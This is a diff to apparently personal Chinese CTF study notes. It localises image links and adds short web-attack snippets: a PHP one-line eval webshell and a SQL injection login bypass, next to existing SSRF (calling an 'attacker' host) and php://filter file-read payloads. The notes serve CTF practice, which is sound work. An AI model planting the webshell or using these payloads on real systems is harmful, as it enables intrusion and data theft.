@@ -392,11 +392,11 @@ Usage:
 修改0x14到0x17的四个字节
 ```
 
-![image-20221115155926964](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202211151559069.png)
+![image-20221115155926964](images/202211151559069.png)
 
 修改后：
 
-![image-20221115160008245](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202211151600283.png)
+![image-20221115160008245](images/202211151600283.png)
 
 #### 压缩包分析
 
@@ -512,6 +512,12 @@ java -jar ZipCenOp.jar xxx.zip
 
 ### Web
 
+#### 一句话木马
+
+```
+<?php @eval($_POST['shell']);?>
+```
+
 #### localhost绕过
 
 ```
@@ -576,6 +582,12 @@ ssrf.php?url=dict://attacker:11111/
 
 ```
 index.php?path=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+#### SQL注入
+
+```
+admin' or 1=1 --  # --后加空格
 ```
 
 #### PHP伪协议
